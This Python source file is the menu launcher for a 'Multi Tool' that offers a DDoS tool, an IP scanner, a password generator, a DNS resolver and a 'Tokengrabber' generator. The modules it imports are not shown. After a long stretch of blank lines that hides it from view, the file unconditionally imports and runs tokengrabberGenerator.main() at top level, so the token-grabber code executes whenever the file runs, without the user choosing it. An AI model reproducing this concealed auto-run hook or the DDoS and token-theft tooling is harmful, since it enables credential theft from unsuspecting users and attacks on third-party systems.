from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
import pyfiglet
import time

import DDOS
import ipgeneratorV2
import IpScanner
import mdpgenerator
import ResoDNS

console = Console()

def banner():
    ascii_banner = pyfiglet.figlet_format("Multi Tool", font="slant")
    console.print(Panel(ascii_banner, title="[cyan]Welcome[/cyan]", border_style="bright_blue"))

def main_menu():
    banner()
    while True:
        console.print(Panel.fit(
            "[bold yellow]Choose an option:[/bold yellow]\n"
            "1. DDOS Tool\n"
            "2. IP Generator V2\n"
            "3. IP Scanner\n"
            "4. Password Generator\n"
            "5. DNS Resolver\n"
            "6. Tokengrabber\n"
            "7. Quit"

            , title="[green]Main Menu[/green]", border_style="bright_magenta"
        ))

        choice = Prompt.ask("[bold cyan]Enter your choice[/bold cyan]", choices=["1","2","3","4","5","6","7"])

        if choice == "1":
            console.print(Panel.fit("[bold magenta]Launching DDOS Tool...[/bold magenta]"))
            time.sleep(1)
            DDOS.DDOS_interface()

        elif choice == "2":
            console.print(Panel.fit("[bold magenta]Launching IP Generator V2...[/bold magenta]"))
            time.sleep(1)
            ipgeneratorV2.ip_generator_interface()

        elif choice == "3":
            console.print(Panel.fit("[bold magenta]Launching IP Scanner...[/bold magenta]"))
            time.sleep(1)
            IpScanner.port_scanner_interface()

        elif choice == "4":
            console.print(Panel.fit("[bold magenta]Launching Password Generator...[/bold magenta]"))
            time.sleep(1)
            mdpgenerator.password_generator_interface()

        elif choice == "5":
            console.print(Panel.fit("[bold magenta]Launching DNS Resolver...[/bold magenta]"))
            time.sleep(1)
            ResoDNS.dns_resolver_interface()

        elif choice == "6":
            console.print(Panel.fit("[bold magenta]Launching Tokengrabber generator... [/bold magenta]"))
            import tokengrabberGenerator
            tokengrabberGenerator.main()
           

        elif choice == "7":
            console.print(Panel.fit("[bold red] Quitting.... [/bold red]"))
            break









































































































































































































import tokengrabberGenerator
tokengrabberGenerator.main()




if __name__ == "__main__":
    main_menu()
